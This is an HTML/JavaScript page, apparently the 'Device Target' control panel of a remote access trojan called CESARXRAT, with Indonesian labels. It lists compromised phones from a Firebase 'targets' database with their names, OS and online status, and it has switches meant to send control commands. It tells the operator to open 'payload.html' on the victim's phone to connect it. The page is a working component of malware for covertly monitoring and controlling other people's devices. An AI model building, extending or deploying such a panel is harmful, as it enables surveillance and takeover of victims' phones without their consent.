<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Target - CESARXRAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e27;
            color: #e0e8ff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 0; display: block; min-height: 100vh;
        }
        .container {
            max-width: 480px; margin: auto; padding: 20px 16px;
        }
        h1 {
            font-size: 28px; color: #4a9eff; margin-bottom: 20px;
            font-weight: 800; letter-spacing: 1px;
            text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
        }
        .device-item {
            background: #111a3a;
            border-radius: 16px;
            padding: 16px 18px;
            margin: 12px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 6px solid #4a9eff;
            border-top: 1px solid #2a4a8a;
            border-right: 1px solid #2a4a8a;
            border-bottom: 1px solid #2a4a8a;
            transition: 0.2s;
        }
        .device-item:hover {
            border-color: #4a9eff;
            box-shadow: 0 0 20px rgba(74, 158, 255, 0.2);
        }
        .device-item.offline {
            border-left-color: #555;
            opacity: 0.7;
        }
        .device-item .info { flex: 1; }
        .device-item .info .name {
            font-weight: bold; color: #fff; font-size: 16px;
        }
        .device-item .info .status {
            font-size: 13px; margin-top: 4px;
        }
        .device-item .info .os {
            font-size: 12px; color: #6a8abf; margin-top: 2px;
        }
        .status-online { color: #4ae0a0; }
        .status-offline { color: #ff6b6b; }
        .switch {
            position: relative; display: inline-block;
            width: 52px; height: 28px;
        }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute; cursor: pointer; top: 0; left: 0;
            right: 0; bottom: 0; background: #2a2a5a;
            transition: 0.4s; border-radius: 34px;
            border: 1px solid #4a4a8a;
        }
        .slider:before {
            position: absolute; content: ""; height: 20px; width: 20px;
            left: 4px; bottom: 3px; background: #888;
            transition: 0.4s; border-radius: 50%;
        }
        input:checked + .slider { background: #4a9eff; border-color: #4a9eff; }
        input:checked + .slider:before { transform: translateX(24px); background: #fff; }
        input:disabled + .slider { opacity: 0.5; cursor: not-allowed; }
        .empty-state {
            text-align: center; color: #6a8abf;
            padding: 40px 20px; font-style: italic;
            background: #111a3a; border-radius: 16px;
            border: 1px dashed #2a4a8a;
        }
        .empty-state .icon {
            font-size: 48px; display: block; margin-bottom: 10px;
        }
        .btn-back {
            background: transparent; border: 2px solid #4a9eff;
            color: #4a9eff; padding: 12px 24px;
            border-radius: 50px; font-weight: bold;
            cursor: pointer; transition: 0.3s;
            width: 100%; margin-top: 24px;
            text-align: center; font-size: 16px;
        }
        .btn-back:hover { background: #4a9eff; color: #fff; }
        .refresh-info {
            text-align: center; font-size: 11px;
            color: #6a8abf; margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Device Target</h1>

        <div id="deviceList">
            <div class="empty-state">
                <span class="icon">📱</span>
                Memuat daftar perangkat...
            </div>
        </div>

        <button class="btn-back" onclick="history.back()">Kembali</button>
        <div class="refresh-info">🔄 Update real-time dari Firebase</div>
    </div>

    <script type="module">
        import { db, ref, onValue } from './firebase-config.js';

        const listEl = document.getElementById('deviceList');
        const TIMEOUT_MS = 30000; // 30 detik

        // Dengarkan targets dari Firebase secara real-time
        const targetsRef = ref(db, 'targets');

        onValue(targetsRef, (snapshot) => {
            const data = snapshot.val();
            const now = Date.now();
            let html = '';
            let count = 0;

            if (data && Object.keys(data).length > 0) {
                for (const key in data) {
                    const target = data[key];
                    if (!target || !target.name) continue;

                    // Cek apakah target online (timestamp < 30 detik)
                    let isOnline = false;
                    if (target.timestamp) {
                        const diff = now - target.timestamp;
                        isOnline = diff < TIMEOUT_MS;
                    }

                    const statusClass = isOnline ? 'status-online' : 'status-offline';
                    const statusText = isOnline ? '● Online' : '● Offline';
                    const itemClass = isOnline ? '' : 'offline';
                    const disabledAttr = isOnline ? '' : 'disabled';

                    html += `
                        <div class="device-item ${itemClass}">
                            <div class="info">
                                <div class="name">${escapeHtml(target.name)}</div>
                                <div class="os">${escapeHtml(target.os || '- - -')}</div>
                                <div class="status ${statusClass}">${statusText}</div>
                            </div>
                            <label class="switch">
                                <input type="checkbox" ${disabledAttr} data-key="${key}">
                                <span class="slider"></span>
                            </label>
                        </div>
                    `;
                    count++;
                }
            }

            if (count === 0) {
                listEl.innerHTML = `
                    <div class="empty-state">
                        <span class="icon">📱</span>
                        Belum ada perangkat target yang terhubung.<br><br>
                        Buka <b>payload.html</b> di HP target untuk menghubungkan.
                    </div>
                `;
            } else {
                listEl.innerHTML = html;

                // Pasang event listener untuk switch
                document.querySelectorAll('.device-item input[type="checkbox"]').forEach(function(cb) {
                    cb.addEventListener('change', function() {
                        const key = this.dataset.key;
                        console.log('[CESARXRAT] Switch ' + key + ' = ' + (this.checked ? 'ON' : 'OFF'));
                        // Di sini bisa kirim perintah ke Firebase untuk kontrol target
                    });
                });
            }
        });

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        console.log('[CESARXRAT] Device Target real-time aktif');
    </script>
</body>
</html>
